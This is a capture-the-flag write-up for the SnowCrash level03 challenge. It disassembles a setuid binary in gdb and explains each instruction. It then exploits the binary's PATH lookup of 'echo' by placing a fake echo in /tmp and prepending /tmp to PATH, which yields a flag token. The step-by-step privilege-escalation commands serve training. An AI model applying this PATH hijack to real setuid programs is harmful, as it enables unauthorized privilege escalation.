# LEVEL 03 - Reversing is.. fun

```shell
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03 # interesting file
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

```shell
level03@SnowCrash:~$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped

# setuid setgid is important, a programm who use those param will be launch with the rights of the file owner.

level03@SnowCrash:~$ ./level03 
Exploit me
```

We can try to open it with gdb to see what this program does.

```shell
gdb level03
```

We can dissasemble the main

```
(gdb) disas main
Dump of assembler code for function main:
   1:0x080484a4 <+0>:     push   %ebp
   2:0x080484a5 <+1>:     mov    %esp,%ebp
   3:0x080484a7 <+3>:     and    $0xfffffff0,%esp
   4:0x080484aa <+6>:     sub    $0x20,%esp
   5:0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   6:0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   7:0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   8:0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   9:0x080484bf <+27>:    mov    0x18(%esp),%eax
   10:0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   11:0x080484c7 <+35>:    mov    0x18(%esp),%eax
   12:0x080484cb <+39>:    mov    %eax,0x4(%esp)
   13:0x080484cf <+43>:    mov    0x18(%esp),%eax
   14:0x080484d3 <+47>:    mov    %eax,(%esp)
   15:0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   16:0x080484db <+55>:    mov    0x1c(%esp),%eax
   17:0x080484df <+59>:    mov    %eax,0x8(%esp)
   18:0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   19:0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   20:0x080484eb <+71>:    mov    0x1c(%esp),%eax
   21:0x080484ef <+75>:    mov    %eax,(%esp)
   22:0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   23:0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   24:0x080484fe <+90>:    call   0x80483b0 <system@plt>
   25:0x08048503 <+95>:    leave  
   26:0x08048504 <+96>:    ret    
End of assembler dump.
```
## CheatSheet ASM reversing
| name | utility |
| ---  | --- |
| %ebp | (**Base Pointer**) Usefull to locate local variables on the Stack. |
| %esp | (**Stack Pointer**) Usefull to locate the top of the Stack. |
| %eax | (**Accumulator Register**) Stock the return value of functions |
| 0x18(%esp)/(%esp)  | Not a register, acces to Stack memory |

1. Initing

```
    3:0x080484a7 <+3>:     and    $0xfffffff0,%esp
    3: Align Stack pointer for performance

    4:0x080484aa <+6>:     sub    $0x20,%esp
    4: Move Stack Pointer 32 octets away for variable.
    4: Hex:0x20 -> int:32
```

2. Getting ids

```
   5:0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   5: Call "Get Effective Group ID" function (Group ID of the processus)

   6:0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   6: Save the GID returned into %eax to the stack.

   7:0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   7: Call "Get Effective User ID"

   8:0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   8: Save the EUID returned into %eax to the stack.
```

3. Prepare arguments for `setresgid`

| Name | meaning | Role |
| ---  | ------- | ---- |
| RGID | Real group | ID who run the program (user) |
| EGID | Effectiv group | ID who verify permissions (who can read this file) |
| SGID | Saved Group | Memorise ID while the program change temporary his identity |

```
     9:0x080484bf <+27>:    mov    0x18(%esp),%eax
     9: Reload GID saved before

    10:0x080484c3 <+31>:    mov    %eax,0x8(%esp)
    10: 3th argument (sgid)

    11:0x080484c7 <+35>:    mov    0x18(%esp),%eax
    11: Save it (sgid) into stack

    12:0x080484cb <+39>:    mov    %eax,0x4(%esp)
    12: 2nd argument (egid)

    13:0x080484cf <+43>:    mov    0x18(%esp),%eax
    13: Save it (egid) into stack

    14:0x080484d3 <+47>:    mov    %eax,(%esp)
    14: 1st argument (rgid)

    15:0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
    15: execute setresgid (group switch)

```

4. Prepare arguments for `setresuid`

It is the same thing as before but with `setresuid` function.

```
   16:0x080484db <+55>:    mov    0x1c(%esp),%eax
   17:0x080484df <+59>:    mov    %eax,0x8(%esp)
   18:0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   19:0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   20:0x080484eb <+71>:    mov    0x1c(%esp),%eax
   21:0x080484ef <+75>:    mov    %eax,(%esp)
   22:0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
```

5. Final execution

```
   23:0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   23: Put a string adress into the stack.

   24:0x080484fe <+90>:    call   0x80483b0 <system@plt>
   24: Execute a command with shell
```

6. String investigation

Using the `x/s adress` gdb command we can show the content of the previous string.

```
(gdb) x/s 0x080485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```

7. Imagination

```c
void    main() {
   gid_t g = getegid();
   uid_t u = geteuid();
   setresgid(g, g, g); 
   setresuid(u, u, u);
   system("/usr/bin/env echo Exploit me"); //0x080485e0
}
```

To resume the `setresgid` and `setresuid` are used to launch the `system` line with the `rights` of the `file owner` (flag03 in this case).

8. Deduction

This line used a `relative path` for `echo` command with the `flag03` user right's.

```c
system("/usr/bin/env echo Exploit me"); //0x080485e0
```

The problem there, is that the shell will look in the `$PATH` variable to locate `echo`. 

Nothing block us to **modify the path**, and so provide a modified echo path before the right one.

```shell
level03@SnowCrash:~$ export | grep PATH
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
```

The goal is to login into flag03 to execute the `getflag` command.

Let this script make it for us.

```shell
level03@SnowCrash:~$ echo "/bin/sh -c 'getflag'" > /tmp/echo # Here we add the getflag command to our new echo
```

```shell
level03@SnowCrash:~$ ls -l /tmp/echo
-rw-rw-r-- 1 level03 level03 21 Apr 26 21:15 /tmp/echo
```

```shell
level03@SnowCrash:~$ chmod 755 /tmp/echo # Change file permissions to permit another user to execute it
```

```shell
level03@SnowCrash:~$ export PATH=/tmp:$PATH # Put the new echo path in first $PATH position
```

```shell
level03@SnowCrash:~$ export | grep PATH
declare -x PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
```

```shell
level03@SnowCrash:~$ ./level03 # Execute the binary pointing to our new echo we get : 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
